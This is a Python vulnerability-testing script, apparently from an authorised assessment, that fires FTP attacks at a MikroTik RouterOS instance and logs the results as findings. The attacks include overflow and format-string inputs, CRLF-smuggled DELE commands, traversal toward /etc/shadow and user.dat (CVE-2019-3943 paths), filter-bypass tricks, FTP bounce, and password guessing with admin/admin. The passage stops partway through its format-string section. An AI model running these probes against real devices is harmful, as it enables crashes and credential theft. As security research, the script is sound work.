#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Track B: Comprehensive FTP Protocol Attack Script
Pristine Target: [REDACTED-INTERNAL-IP] (FTP:21)

FTP binary: 34KB, ELF32 i386, no NX/canary/PIE — any buffer overflow is directly exploitable.

Tests (~200 across 9 sections):
  1. Authentication Attacks (20)          — anonymous, null, overflow, format string, SQLi, brute force
  2. Command Overflow (30)                — oversized args to 13 FTP commands at 6 sizes
  3. Path Traversal (40)                  — CWD/RETR/STOR/LIST/SIZE with encoding bypasses
  4. isSensitiveFile Bypass (20)          — user.dat, flash/rw/store, case/null/unicode tricks
  5. FTP Bounce & Data Connection (20)    — PORT/EPRT/PASV/EPSV abuse, localhost bounce
  6. Format String via sscanf (20)        — %x/%p/%s/%n in all command arguments
  7. Command Injection & Edge Cases (25)  — SITE, unknown cmds, REST, TYPE/STRU/MODE
  8. Race Conditions (10)                 — TOCTOU, concurrent ops, rapid connect/disconnect
  9. Pre/Post Authentication Boundary (15)— command ordering, re-auth, REIN

Evidence: evidence/attack_ftpd.json
"""

import os
import socket
import sys
import time
import threading
import warnings
from io import BytesIO
from pathlib import Path

warnings.filterwarnings("ignore")

sys.path.insert(0, str(Path(__file__).parent))
from mikrotik_common import (
    EvidenceCollector, log, check_router_alive, wait_for_router,
    pull_logs_before_destructive_action, pull_router_logs,
    EVIDENCE_DIR, BASE_DIR
)

# ── Target Configuration (pristine instance override) ────────────────────────
TARGET = "[REDACTED-INTERNAL-IP]"
FTP_PORT = 21
ADMIN_USER = "admin"
ADMIN_PASS = "admin"

# Override mikrotik_common globals so check_router_alive / pull_router_logs
# point at the pristine target, not the default [REDACTED-INTERNAL-IP].
import mikrotik_common
mikrotik_common.TARGET = TARGET
mikrotik_common.ADMIN_USER = ADMIN_USER
mikrotik_common.ADMIN_PASS = ADMIN_PASS

ec = EvidenceCollector("attack_ftpd.py", phase="Track-B FTP Deep Dive")


# ── Utility: Raw FTP socket communication ────────────────────────────────────

def ftp_raw(commands, timeout=10):
    """Send raw FTP commands and return responses.

    Each entry in `commands` may be a str (encoded to UTF-8) or raw bytes.
    Returns a list of response strings (banner first, then one per command).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, FTP_PORT))
        banner = s.recv(4096).decode("utf-8", errors="replace")
        responses = [banner]
        for cmd in commands:
            if isinstance(cmd, bytes):
                s.sendall(cmd + b"\r\n")
            else:
                s.sendall((cmd + "\r\n").encode())
            time.sleep(0.3)
            try:
                resp = s.recv(4096).decode("utf-8", errors="replace")
                responses.append(resp)
            except socket.timeout:
                responses.append("TIMEOUT")
        s.close()
        return responses
    except Exception as e:
        return [f"ERROR: {e}"]


def ftp_auth_raw(commands, timeout=10):
    """Send FTP commands after authenticating with admin credentials."""
    auth_cmds = [f"USER {ADMIN_USER}", f"PASS {ADMIN_PASS}"] + commands
    return ftp_raw(auth_cmds, timeout)


def ftp_raw_bytes(raw_payload, timeout=10):
    """Send a single raw byte payload (no CRLF appended) and return response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, FTP_PORT))
        banner = s.recv(4096).decode("utf-8", errors="replace")
        s.sendall(raw_payload)
        time.sleep(0.3)
        try:
            resp = s.recv(4096).decode("utf-8", errors="replace")
        except socket.timeout:
            resp = "TIMEOUT"
        s.close()
        return [banner, resp]
    except Exception as e:
        return [f"ERROR: {e}"]


def health_check(context=""):
    """Quick health check wrapper that uses our overridden TARGET."""
    status = check_router_alive(timeout=5)
    if not status.get("alive"):
        log(f"  ROUTER DOWN after {context}! Waiting for recovery...")
        ec.add_finding("CRITICAL", f"Router crash during FTP test: {context}",
                       f"Router became unreachable during: {context}. "
                       f"FTP binary (34KB ELF32 i386, no NX/canary/PIE) may have crashed.",
                       cwe="CWE-120",
                       reproduction_steps=[
                           f"1. Connect to {TARGET}:{FTP_PORT}",
                           f"2. Execute test: {context}",
                           "3. Router becomes unreachable"])
        wait_for_router(max_wait=120)
        return False
    return True


def response_code(resp_str):
    """Extract the 3-digit FTP response code from a response string."""
    if not resp_str or resp_str.startswith("ERROR") or resp_str == "TIMEOUT":
        return None
    try:
        return int(resp_str.strip()[:3])
    except (ValueError, IndexError):
        return None


# =============================================================================
# Section 1: Authentication Attacks (20 tests)
# =============================================================================

def section_1_authentication():
    log("=" * 60)
    log("Section 1: Authentication Attacks (20 tests)")
    log("=" * 60)

    # ── 1.1: Banner capture ──────────────────────────────────────────────────
    resps = ftp_raw([])
    banner = resps[0] if resps else "NO BANNER"
    is_anomaly = any(kw in banner.lower() for kw in ["mikrotik", "routeros", "version"])
    ec.add_test("auth", "FTP banner capture",
                "Capture FTP welcome banner for version/service disclosure",
                f"Banner: {banner.strip()}",
                {"banner": banner.strip()},
                anomaly=is_anomaly)
    if is_anomaly:
        ec.add_finding("INFO", "FTP banner discloses product identity",
                       f"FTP banner: {banner.strip()}", cwe="CWE-200")

    # ── 1.2: Anonymous login ─────────────────────────────────────────────────
    resps = ftp_raw(["USER anonymous", "PASS test@example.com"])
    pass_resp = resps[2] if len(resps) > 2 else "NO RESPONSE"
    anon_ok = response_code(pass_resp) in (230, 232)
    ec.add_test("auth", "Anonymous login (anonymous/test@)",
                "Attempt anonymous FTP login",
                f"Response: {pass_resp.strip()}",
                {"user_resp": resps[1].strip() if len(resps) > 1 else "",
                 "pass_resp": pass_resp.strip()},
                anomaly=anon_ok)
    if anon_ok:
        ec.add_finding("HIGH", "FTP anonymous access enabled",
                       "Anonymous FTP login accepted", cwe="CWE-287")

    # ── 1.3: Anonymous with ftp user ─────────────────────────────────────────
    resps = ftp_raw(["USER ftp", "PASS ftp@"])
    pass_resp = resps[2] if len(resps) > 2 else "NO RESPONSE"
    ec.add_test("auth", "Anonymous login (ftp/ftp@)",
                "Attempt login with USER ftp / PASS ftp@",
                f"Response: {pass_resp.strip()}",
                {"pass_resp": pass_resp.strip()},
                anomaly=response_code(pass_resp) in (230, 232))

    # ── 1.4: Null/empty password ─────────────────────────────────────────────
    resps = ftp_raw([f"USER {ADMIN_USER}", "PASS "])
    pass_resp = resps[2] if len(resps) > 2 else "NO RESPONSE"
    ec.add_test("auth", "Empty password",
                "Login with valid user and empty PASS",
                f"Response: {pass_resp.strip()}",
                {"pass_resp": pass_resp.strip()},
                anomaly=response_code(pass_resp) == 230)

    # ── 1.5: Empty USER and PASS ────────────────────────────────────────────
    resps = ftp_raw(["USER ", "PASS "])
    pass_resp = resps[2] if len(resps) > 2 else "NO RESPONSE"
    ec.add_test("auth", "Empty USER and PASS",
                "Login with empty username and empty password",
                f"Response: {pass_resp.strip()}",
                {"responses": [r.strip() for r in resps]},
                anomaly=response_code(pass_resp) == 230)

    # ── 1.6-1.9: Long username overflow ──────────────────────────────────────
    for size in [256, 1024, 4096, 65536]:
        long_user = "A" * size
        resps = ftp_raw([f"USER {long_user}"], timeout=15)
        resp = resps[1] if len(resps) > 1 else "NO RESPONSE"
        is_err = resp.startswith("ERROR") or resp == "TIMEOUT"
        ec.add_test("auth", f"Long username ({size}B)",
                    f"Send {size}-byte username in USER command",
                    f"Response: {resp[:200].strip()}",
                    {"size": size, "response": resp[:500].strip(),
                     "connection_error": is_err},
                    anomaly=is_err)
        if not health_check(f"long username {size}B"):
            break

    # ── 1.10-1.13: Long password overflow ────────────────────────────────────
    for size in [256, 1024, 4096, 65536]:
        long_pass = "B" * size
        resps = ftp_raw([f"USER {ADMIN_USER}", f"PASS {long_pass}"], timeout=15)
        resp = resps[2] if len(resps) > 2 else (resps[-1] if resps else "NO RESPONSE")
        is_err = resp.startswith("ERROR") or resp == "TIMEOUT"
        ec.add_test("auth", f"Long password ({size}B)",
                    f"Send {size}-byte password in PASS command",
                    f"Response: {resp[:200].strip()}",
                    {"size": size, "response": resp[:500].strip(),
                     "connection_error": is_err},
                    anomaly=is_err)
        if not health_check(f"long password {size}B"):
            break

    # ── 1.14: Unicode credentials ────────────────────────────────────────────
    resps = ftp_raw(["USER \xc0\xae\xc0\xae\xc0\xaf", "PASS \xc0\xae\xc0\xae"])
    resp = resps[1] if len(resps) > 1 else "NO RESPONSE"
    ec.add_test("auth", "Unicode username",
                "Send UTF-8 overlong encoding in USER command",
                f"Response: {resp[:200].strip()}",
                {"response": resp[:500].strip()})

    # ── 1.15-1.18: Format string in USER/PASS ───────────────────────────────
    fmt_payloads = [
        ("%x.%x.%x.%x", "hex leak"),
        ("%n%n%n%n", "write via %n"),
        ("%s%s%s%s", "string deref via %s"),
        ("%p.%p.%p.%p.%p.%p.%p.%p", "pointer leak via %p"),
    ]
    for payload, desc in fmt_payloads:
        resps = ftp_raw([f"USER {payload}", f"PASS {payload}"])
        user_resp = resps[1] if len(resps) > 1 else ""
        pass_resp = resps[2] if len(resps) > 2 else ""
        # Check if response contains hex addresses (format string leak)
        has_leak = any(c in user_resp + pass_resp for c in ["0x", "ffff", "bfff"])
        ec.add_test("auth", f"Format string in creds: {desc}",
                    f"Send format string '{payload}' as USER and PASS",
                    f"USER resp: {user_resp[:150].strip()} | PASS resp: {pass_resp[:150].strip()}",
                    {"payload": payload, "user_resp": user_resp[:500].strip(),
                     "pass_resp": pass_resp[:500].strip(), "possible_leak": has_leak},
                    anomaly=has_leak)
        if has_leak:
            ec.add_finding("HIGH", f"FTP format string information leak ({desc})",
                           f"Format specifier '{payload}' in credentials produced "
                           f"suspicious response suggesting memory disclosure",
                           cwe="CWE-134")

    # ── 1.19: SQL injection in credentials ───────────────────────────────────
    sqli_payloads = [
        "' OR '1'='1",
        "admin'--",
        "\" OR \"1\"=\"1",
    ]
    for payload in sqli_payloads:
        resps = ftp_raw([f"USER {payload}", f"PASS {payload}"])
        pass_resp = resps[2] if len(resps) > 2 else ""
        ec.add_test("auth", f"SQLi in creds: {payload[:30]}",
                    f"SQL injection in FTP credentials: {payload[:30]}",
                    f"Response: {pass_resp[:200].strip()}",
                    {"payload": payload, "pass_resp": pass_resp[:500].strip()},
                    anomaly=response_code(pass_resp) == 230)

    # ── 1.20: Brute force rate limiting ──────────────────────────────────────
    log("  Testing brute force rate limiting (10 rapid attempts)...")
    bf_results = []
    blocked = False
    for i in range(10):
        start = time.time()
        resps = ftp_raw([f"USER {ADMIN_USER}", f"PASS wrong{i}"], timeout=5)
        elapsed = time.time() - start
        resp = resps[2] if len(resps) > 2 else (resps[-1] if resps else "ERROR")
        code = response_code(resp)
        bf_results.append({"attempt": i + 1, "code": code,
                           "elapsed_ms": round(elapsed * 1000, 1),
                           "response": resp[:100].strip()})
        if resp.startswith("ERROR") and "refused" in resp.lower():
            blocked = True
            break

    ec.add_test("auth", "Brute force rate limiting",
                "10 rapid failed login attempts to detect rate limiting/lockout",
                f"Completed {len(bf_results)} attempts, blocked={blocked}",
                {"attempts": bf_results, "blocked": blocked},
                anomaly=not blocked)
    if not blocked:
        ec.add_finding("LOW", "No FTP brute force protection",
                       f"10 rapid failed login attempts completed without lockout or delay. "
                       f"Brute force attacks are feasible.",
                       cwe="CWE-307")

    health_check("section 1 complete")


# =============================================================================
# Section 2: Command Overflow (30 tests)
# =============================================================================

def section_2_command_overflow():
    log("=" * 60)
    log("Section 2: Command Argument Overflow (30 tests)")
    log("=" * 60)

    commands = ["USER", "PASS", "CWD", "RETR", "STOR", "MKD", "RMD",
                "DELE", "RNFR", "RNTO", "LIST", "NLST", "SIZE"]
    sizes = [256, 512, 1024, 4096, 8192, 65536]

    # We run a representative matrix: each command at 2-3 sizes to stay ~30 tests.
    # All 13 commands x 2 sizes = 26, plus 4 extras at 65536.
    test_matrix = []
    for cmd in commands:
        test_matrix.append((cmd, 1024))
        test_matrix.append((cmd, 8192))
    # Add extreme sizes for critical commands
    for cmd in ["USER", "CWD", "RETR", "STOR"]:
        test_matrix.append((cmd, 65536))

    # Limit to ~30 tests
    test_matrix = test_matrix[:30]

    for cmd, size in test_matrix:
        payload = "A" * size
        if cmd in ("USER", "PASS"):
            # Pre-auth: send directly
            resps = ftp_raw([f"{cmd} {payload}"], timeout=15)
            resp = resps[1] if len(resps) > 1 else "NO RESPONSE"
        else:
            # Post-auth: login first
            resps = ftp_auth_raw([f"{cmd} {payload}"], timeout=15)
            resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")

        is_err = resp.startswith("ERROR") or resp == "TIMEOUT"
        ec.add_test("overflow", f"{cmd} overflow ({size}B)",
                    f"Send {cmd} with {size}-byte argument (overflow test)",
                    f"Response: {resp[:200].strip()}",
                    {"command": cmd, "arg_size": size,
                     "response": resp[:500].strip(),
                     "connection_error": is_err},
                    anomaly=is_err)
        if not health_check(f"{cmd} overflow {size}B"):
            break

    # ── Null bytes in arguments ──────────────────────────────────────────────
    for cmd in ["CWD", "RETR", "MKD"]:
        null_payload = f"test\x00../../etc/passwd"
        resps = ftp_auth_raw([f"{cmd} {null_payload}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        ec.add_test("overflow", f"{cmd} null byte injection",
                    f"Send {cmd} with embedded null byte in argument",
                    f"Response: {resp[:200].strip()}",
                    {"command": cmd, "payload_repr": repr(null_payload),
                     "response": resp[:500].strip()})

    # ── CRLF injection in arguments ──────────────────────────────────────────
    for cmd in ["CWD", "RETR", "MKD"]:
        crlf_payload = f"test\r\nDELE important_file"
        # Must use raw bytes to preserve the CRLF in-argument
        auth_bytes = f"USER {ADMIN_USER}\r\nPASS {ADMIN_PASS}\r\n{cmd} {crlf_payload}\r\n"
        resps = ftp_raw_bytes(auth_bytes.encode())
        all_resp = " | ".join(r[:100].strip() for r in resps)
        ec.add_test("overflow", f"{cmd} CRLF injection",
                    f"Inject CRLF in {cmd} argument to pipeline DELE command",
                    f"Responses: {all_resp[:300]}",
                    {"command": cmd, "payload_repr": repr(crlf_payload),
                     "responses": [r[:300].strip() for r in resps]},
                    anomaly="250" in all_resp or "DELE" not in all_resp.upper())

    health_check("section 2 complete")


# =============================================================================
# Section 3: Path Traversal (40 tests)
# =============================================================================

def section_3_path_traversal():
    log("=" * 60)
    log("Section 3: Path Traversal Attacks (40 tests)")
    log("=" * 60)

    # ── CWD traversal vectors ────────────────────────────────────────────────
    cwd_paths = [
        ("../../etc", "basic traversal ../../etc"),
        ("../../../etc/passwd", "deep traversal etc/passwd"),
        ("....//....//etc", "double-dot-slash bypass"),
        ("/etc/passwd", "absolute path /etc/passwd"),
        ("/", "root directory"),
        ("/../../../etc", "root + traversal"),
        ("./../../../etc", "dot + traversal"),
        ("..;/etc", "semicolon traversal"),
        ("%2e%2e%2f%2e%2e%2fetc", "URL-encoded traversal"),
        ("%252e%252e%252f%252e%252e%252f", "double URL-encoded"),
        ("..%c0%af..%c0%af", "Unicode overlong slash"),
        ("..%c1%9c..%c1%9c", "Unicode overlong backslash"),
        ("..\\..\\", "backslash traversal"),
        ("..\\..\\..\\etc\\passwd", "backslash to etc/passwd"),
        (".../.../etc", "triple-dot traversal"),
    ]

    for path, desc in cwd_paths:
        resps = ftp_auth_raw([f"CWD {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        traversal_ok = code == 250
        ec.add_test("traversal", f"CWD: {desc}",
                    f"Directory traversal via CWD '{path}'",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"path": path, "response_code": code,
                     "response": resp[:500].strip(),
                     "traversal_accepted": traversal_ok},
                    anomaly=traversal_ok)
        if traversal_ok and "etc" in path:
            ec.add_finding("HIGH", f"FTP path traversal via CWD: {desc}",
                           f"CWD accepted traversal path: {path}", cwe="CWE-22")

    # ── RETR traversal vectors ───────────────────────────────────────────────
    retr_paths = [
        ("../../etc/passwd", "basic etc/passwd"),
        ("../../../etc/shadow", "etc/shadow"),
        ("/etc/passwd", "absolute /etc/passwd"),
        ("....//etc//passwd", "double-dot-slash bypass"),
        ("../../etc/passwd%00.txt", "null byte extension"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded"),
        ("..\\..\\etc\\passwd", "backslash traversal"),
    ]

    for path, desc in retr_paths:
        resps = ftp_auth_raw([f"RETR {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        # 150/125 = transfer starting = file found
        retrieved = code in (150, 125, 226)
        ec.add_test("traversal", f"RETR: {desc}",
                    f"File retrieval traversal via RETR '{path}'",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"path": path, "response_code": code,
                     "response": resp[:500].strip(),
                     "file_retrieved": retrieved},
                    anomaly=retrieved)
        if retrieved:
            ec.add_finding("HIGH", f"FTP file retrieval traversal: {desc}",
                           f"RETR accepted traversal path: {path}", cwe="CWE-22")

    # ── STOR traversal vectors ───────────────────────────────────────────────
    stor_paths = [
        ("../../tmp/ftp_test_trav", "basic ../../tmp write"),
        ("/tmp/ftp_test_direct", "absolute /tmp write"),
        ("../../../tmp/ftp_pwned", "deep traversal /tmp"),
        ("....//tmp//ftp_test", "double-dot-slash /tmp"),
    ]

    for path, desc in stor_paths:
        resps = ftp_auth_raw([f"STOR {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        upload_accepted = code in (150, 125)
        ec.add_test("traversal", f"STOR: {desc}",
                    f"Upload traversal via STOR '{path}'",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"path": path, "response_code": code,
                     "response": resp[:500].strip(),
                     "upload_accepted": upload_accepted},
                    anomaly=upload_accepted)
        if upload_accepted:
            ec.add_finding("HIGH", f"FTP upload traversal: {desc}",
                           f"STOR accepted traversal path: {path}", cwe="CWE-22")

    # ── LIST/SIZE with traversal ─────────────────────────────────────────────
    for cmd in ["LIST", "SIZE", "NLST"]:
        path = "../../etc"
        resps = ftp_auth_raw([f"{cmd} {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("traversal", f"{cmd} traversal: {path}",
                    f"Traversal via {cmd} '{path}'",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"command": cmd, "path": path, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 125, 213, 226))

    # ── Long path truncation + traversal ─────────────────────────────────────
    # Pad to buffer boundary then append traversal
    for pad_size in [240, 250, 255, 256]:
        path = "A" * pad_size + "/../../etc/passwd"
        resps = ftp_auth_raw([f"CWD {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("traversal", f"Truncation+traversal (pad={pad_size})",
                    f"CWD with {pad_size}-byte prefix + ../../etc/passwd (truncation bypass)",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"pad_size": pad_size, "total_length": len(path),
                     "response_code": code, "response": resp[:500].strip()},
                    anomaly=code == 250)

    # ── CVE-2019-3943 specific vectors (MikroTik FTP traversal) ──────────────
    cve_paths = [
        "../../../../../flash/rw/store/user.dat",
        "../flash/rw/store/user.dat",
        "../../flash/rw/store/user.dat",
        "../../../../../flash/nova/etc/devel-login",
    ]
    for path in cve_paths:
        resps = ftp_auth_raw([f"RETR {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        retrieved = code in (150, 125, 226)
        ec.add_test("traversal", f"CVE-2019-3943: {path[:40]}",
                    f"CVE-2019-3943 vector: RETR {path}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"cve": "CVE-2019-3943", "path": path,
                     "response_code": code, "response": resp[:500].strip(),
                     "file_retrieved": retrieved},
                    anomaly=retrieved)
        if retrieved:
            ec.add_finding("CRITICAL",
                           "CVE-2019-3943 regression: FTP path traversal to sensitive files",
                           f"RETR successfully retrieved: {path}",
                           cwe="CWE-22", cvss="7.5")

    health_check("section 3 complete")


# =============================================================================
# Section 4: isSensitiveFile Bypass (20 tests)
# =============================================================================

def section_4_sensitive_file_bypass():
    log("=" * 60)
    log("Section 4: isSensitiveFile Bypass (20 tests)")
    log("=" * 60)

    # Known sensitive paths on MikroTik
    sensitive_paths = [
        "user.dat",
        "/flash/rw/store/user.dat",
        "/rw/store/user.dat",
        "/flash/nova/etc/devel-login",
        "/nova/etc/devel-login",
        "/flash/rw/RESET",
    ]

    for path in sensitive_paths:
        resps = ftp_auth_raw([f"RETR {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("sensitive", f"Direct access: {path[:40]}",
                    f"Attempt to retrieve known sensitive file: {path}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"path": path, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 125, 226))

    # Case variation bypasses
    case_variants = [
        "User.Dat", "USER.DAT", "user.DAT", "USER.dat",
        "User.dat", "usEr.dAt",
    ]
    for variant in case_variants:
        resps = ftp_auth_raw([f"RETR {variant}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("sensitive", f"Case bypass: {variant}",
                    f"Case variation bypass: RETR {variant}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"filename": variant, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 125, 226))
        if code in (150, 125, 226):
            ec.add_finding("HIGH", f"isSensitiveFile case bypass: {variant}",
                           f"Case variation '{variant}' bypassed sensitive file check",
                           cwe="CWE-178")

    # Null byte before extension
    null_variants = [
        "user.dat%00.txt",
        "user.dat\x00.jpg",
        "user%00.dat",
    ]
    for variant in null_variants:
        resps = ftp_auth_raw([f"RETR {variant}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("sensitive", f"Null byte bypass: {repr(variant)[:30]}",
                    f"Null byte extension bypass: {repr(variant)[:40]}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"filename_repr": repr(variant), "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 125, 226))

    # Unicode equivalent characters
    unicode_variants = [
        "user\uff0edat",      # fullwidth period
        "\u0075\u0073\u0065\u0072.dat",  # normal but spelled out
        "us\u0435r.dat",      # Cyrillic 'e' (U+0435)
        "user.d\u0430t",      # Cyrillic 'a' (U+0430)
    ]
    for variant in unicode_variants:
        resps = ftp_auth_raw([f"RETR {variant}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("sensitive", f"Unicode bypass: {repr(variant)[:30]}",
                    f"Unicode homoglyph bypass: {repr(variant)[:40]}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"filename_repr": repr(variant), "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 125, 226))

    # Traversal to sensitive files via different starting points
    traversal_sensitive = [
        "../flash/rw/store/user.dat",
        "./user.dat",
    ]
    for path in traversal_sensitive:
        resps = ftp_auth_raw([f"RETR {path}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("sensitive", f"Traversal to sensitive: {path[:40]}",
                    f"Traversal-based sensitive file access: {path}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"path": path, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 125, 226))

    health_check("section 4 complete")


# =============================================================================
# Section 5: FTP Bounce & Data Connection (20 tests)
# =============================================================================

def section_5_bounce_data():
    log("=" * 60)
    log("Section 5: FTP Bounce & Data Connection Attacks (20 tests)")
    log("=" * 60)

    # ── PORT to localhost ────────────────────────────────────────────────────
    bounce_targets = [
        ("127,0,0,1", 80, "Loopback HTTP"),
        ("127,0,0,1", 22, "Loopback SSH"),
        ("127,0,0,1", 21, "Loopback FTP (self)"),
        ("127,0,0,1", 23, "Loopback Telnet"),
        ("127,0,0,1", 8291, "Loopback Winbox"),
        ("10,0,0,1", 80, "Gateway HTTP"),
        ("10,0,0,113", 80, "Self HTTP"),
        ("192,168,1,1", 80, "Private network 192.168"),
        ("172,16,0,1", 80, "Private network 172.16"),
        ("10,0,0,110", 80, "Other router HTTP"),
    ]

    for ip_commas, port, desc in bounce_targets:
        p1, p2 = port // 256, port % 256
        port_cmd = f"PORT {ip_commas},{p1},{p2}"
        resps = ftp_auth_raw([port_cmd], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        accepted = code == 200
        ec.add_test("bounce", f"PORT bounce: {desc}",
                    f"FTP bounce via PORT to {ip_commas.replace(',','.')}:{port}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"port_cmd": port_cmd, "target": desc,
                     "response_code": code, "response": resp[:500].strip(),
                     "port_accepted": accepted},
                    anomaly=accepted)
        if accepted and "127" in ip_commas:
            ec.add_finding("MEDIUM", f"FTP bounce to localhost ({desc})",
                           f"PORT command accepted for loopback address: {port_cmd}",
                           cwe="CWE-441")

    # ── EPRT to IPv6 loopback ────────────────────────────────────────────────
    eprt_targets = [
        ("|1|127.0.0.1|80|", "IPv4 loopback via EPRT"),
        ("|2|::1|80|", "IPv6 loopback via EPRT"),
        ("|1|0.0.0.0|80|", "EPRT to 0.0.0.0"),
        ("|1|[REDACTED-INTERNAL-IP]|80|", "EPRT to self"),
    ]
    for eprt_arg, desc in eprt_targets:
        resps = ftp_auth_raw([f"EPRT {eprt_arg}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("bounce", f"EPRT: {desc}",
                    f"Extended PORT command: EPRT {eprt_arg}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"eprt_arg": eprt_arg, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code == 200)

    # ── PASV response parsing ────────────────────────────────────────────────
    resps = ftp_auth_raw(["PASV"], timeout=10)
    resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
    pasv_ip = None
    pasv_port = None
    if "227" in resp:
        # Parse 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
        import re
        m = re.search(r"\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)", resp)
        if m:
            parts = [int(g) for g in m.groups()]
            pasv_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{parts[3]}"
            pasv_port = parts[4] * 256 + parts[5]

    ec.add_test("bounce", "PASV response analysis",
                "Issue PASV and analyze returned IP:port (check for internal IP leak)",
                f"Response: {resp[:200].strip()} → IP={pasv_ip} Port={pasv_port}",
                {"response": resp[:500].strip(), "pasv_ip": pasv_ip,
                 "pasv_port": pasv_port},
                anomaly=pasv_ip and pasv_ip.startswith(("10.", "192.168.", "172.")))

    # ── EPSV response ────────────────────────────────────────────────────────
    resps = ftp_auth_raw(["EPSV"], timeout=10)
    resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
    ec.add_test("bounce", "EPSV response",
                "Issue EPSV command",
                f"Response: {resp[:200].strip()}",
                {"response": resp[:500].strip()})

    # ── PORT to privileged ports ─────────────────────────────────────────────
    for port in [1, 7, 19, 25, 53]:
        p1, p2 = port // 256, port % 256
        port_cmd = f"PORT 127,0,0,1,{p1},{p2}"
        resps = ftp_auth_raw([port_cmd], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("bounce", f"PORT to privileged port {port}",
                    f"PORT command targeting privileged port {port}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"port": port, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code == 200)

    # ── Data connection without authentication ───────────────────────────────
    resps = ftp_raw(["PASV"])
    resp = resps[1] if len(resps) > 1 else "NO RESPONSE"
    code = response_code(resp)
    ec.add_test("bounce", "PASV before auth",
                "Issue PASV command before authenticating (should be rejected)",
                f"Response: {resp[:200].strip()} (code={code})",
                {"response_code": code, "response": resp[:500].strip()},
                anomaly=code == 227)

    health_check("section 5 complete")


# =============================================================================
# Section 6: Format String via sscanf (20 tests)
# =============================================================================

def section_6_format_string():
    log("=" * 60)
    log("Section 6: Format String Attacks (20 tests)")
    log("=" * 60)

    fmt_specifiers = [
        "%x" * 20,
        "%p" * 20,
        "%s" * 10,
        "%n" * 4,
        "%08x." * 16,
        "AAAA" + "%x" * 50,
        "%d" * 20,
        "%f" * 10,
        "%1000000x",
        "%.65535d",
    ]

    # Test format strings in various FTP commands (post-auth)
    target_commands = ["CWD", "RETR", "STOR", "MKD", "DELE", "SIZE",
                       "RNFR", "RNTO", "RMD", "LIST"]

    # Build ~20 tests from combinations
    test_pairs = []
    for i, cmd in enumerate(target_commands):
        test_pairs.append((cmd, fmt_specifiers[i % len(fmt_specifiers)]))
    # Add extras for critical specifiers
    test_pairs.append(("CWD", "%n" * 8))
    test_pairs.append(("RETR", "%s" * 20))
    test_pairs.append(("STOR", "%p" * 30))
    test_pairs.append(("MKD", "AAAA" + "%08x." * 30))
    test_pairs.append(("CWD", "%1000000x"))
    # Additional: format strings in PORT command fields
    test_pairs.append(("PORT_SPECIAL", "%x,%x,%x,%x,%x,%x"))
    # Format string in REST offset
    test_pairs.append(("REST_SPECIAL", "%x%x%x%x"))
    # Format string in TYPE
    test_pairs.append(("TYPE_SPECIAL", "%n%n"))
    # Format string in RNFR -> RNTO
    test_pairs.append(("RNFR_SPECIAL", "%p" * 20))
